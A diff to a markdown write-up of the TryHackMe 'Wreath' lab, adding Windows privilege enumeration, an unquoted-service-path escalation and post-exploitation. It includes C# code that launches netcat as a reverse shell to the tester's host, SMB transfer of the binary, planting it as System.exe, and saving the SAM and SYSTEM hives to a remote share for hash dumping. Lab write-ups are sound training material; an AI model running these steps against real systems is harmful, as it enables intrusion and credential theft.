@@ -596,7 +596,7 @@ _____________________________________
   - File extension
   - Image size
 
-<details open>
+<details>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -1146,7 +1146,302 @@ C:\xampp\htdocs\resources\uploads>
 
 _____________________________________
 
+### Privilege enumeration
+
+Check current privileges
+```
+C:\xampp\htdocs\resources\uploads>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+```
+C:\xampp\htdocs\resources\uploads>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288 
+```
+
+```
+C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
+Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
+Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
+AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
+LSM                                                                                 LSM                                                                                                                                   Unknown    
+Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
+NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
+Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
+Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
+Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
+
+```
+
+```
+C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
+sc qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+```
+
+```
+C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         BUILTIN\Users Allow  -1610612736
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
+         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
+         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
+         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
+         ;;S-1-15-2-2)
+```
+
+Two findings:
+
+- We have privilege that could be used to escalate to system permissions. However, we need to obfuscate the exploit to get past Defender; or
+- We have unquoted service path vulnerability for a service running as the system account - `SystemExplorerHelpService`
+
+_____________________________________
+
 ### Privilege escalation
+
+Create exploit
+
+```cs
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+                Process proc = new Process();
+                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-Neozer0.exe", "10.50.86.79 49999 -e cmd.exe");
+                procInfo.CreateNoWindow = true;
+                proc.StartInfo = procInfo;
+                proc.Start();
+        }
+    }
+}
+```
+
+Now we compile the program with Mono `mcs` compiler
+
+```
+kali@kali:~/thm/wreath$ mcs Wrapper.cs 
+kali@kali:~/thm/wreath$ ls Wrapper*
+Wrapper.cs  Wrapper.exe
+kali@kali:~/thm/wreath$ file Wrapper.exe 
+Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+We upload executable using Impacket
+
+Start smb server on our IP serving a share called `share` in current directory. This is also using SMBv2 for relatively up to date targets
+```
+kali@kali:~/thm/wreath$ sudo python3 ~/code/impacket/examples/smbserver.py share . -smb2support -username user -password hellotheretaco
+Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+In the reverse shell we run
+- `net use \\10.50.86.79\share /USER:user hellotheretaco`
+
+```
+C:\xampp\htdocs\resources\uploads>net use \\10.50.86.79\share /USER:user hellotheretaco
+net use \\10.50.86.79\share /USER:user hellotheretaco
+The command completed successfully.
+
+
+C:\xampp\htdocs\resources\uploads>copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
+copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
+        1 file(s) copied.
+```
+
+We now start another listener and execute to see if exploit works
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+```
+
+```
+C:\xampp\htdocs\resources\uploads>"%TEMP%\wrapper-Neozer0.exe"
+"%TEMP%\wrapper-Neozer0.exe"
+```
+
+We get a reverse shell
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50512
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+```
+
+Copy over file to `Program.exe`
+
+`copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"`
+
+```
+C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
+copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
+        1 file(s) copied.
+
+C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
+dir "C:\Program Files (x86)\System Explorer\"
+ Volume in drive C has no label.
+ Volume Serial Number is A041-2802
+
+ Directory of C:\Program Files (x86)\System Explorer
+
+25/04/2021  08:58    <DIR>          .
+25/04/2021  08:58    <DIR>          ..
+22/12/2020  00:55    <DIR>          System Explorer
+25/04/2021  08:00             3,584 System.exe
+               1 File(s)          3,584 bytes
+               3 Dir(s)   6,967,848,960 bytes free
+```
+
+Restart service
+
+Stop - `sc stop SystemExplorerHelpService`
+
+Start - `sc start SystemExplorerHelpService`
+
+```
+C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
+sc stop SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+
+C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
+sc start SystemExplorerHelpService
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
+And we check on our listener with `root`
+``` 
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50544
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+_____________________________________
+
+### Exfiltration & Post Exploitation
+
+Exfiltrate hashes
+
+```
+
+C:\Windows\system32>net use \\10.50.86.79\share /USER:user hellotheretaco
+net use \\10.50.86.79\share /USER:user hellotheretaco
+The command completed successfully.
+
+
+C:\Windows\system32>reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
+reg.exe save HKLM\SAM \\10.50.86.79\share\sam.bak
+The operation completed successfully.
+
+C:\Windows\system32>reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak 
+reg.exe save HKLM\SYSTEM \\10.50.86.79\share\system.bak
+The operation completed successfully.
+
+```
+
+Use `Impacket`
+```
+kali@kali:~/thm/wreath$ ls sam* system*
+sam.bak  system.bak
+
+kali@kali:~/thm/wreath$ python3 ~/code/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
+Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:********************************:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:********************************:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:********************************:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:********************************:::
+[*] Cleaning up... 
+```
 
 _____________________________________
 
@@ -1154,6 +1449,9 @@ _____________________________________
 
 - delete c:\windows\temp\nc-Neozer0.exe
 - delete resources/uploads/shell-Neozer0.jpeg.php
+- stop sharing service `net use \\ATTACKER_IP\share /del`
+- `del "C:\Program Files (x86)\System Explorer\System.exe"`
+- `sc start SystemExplorerHelpService`
 
 </details>
 
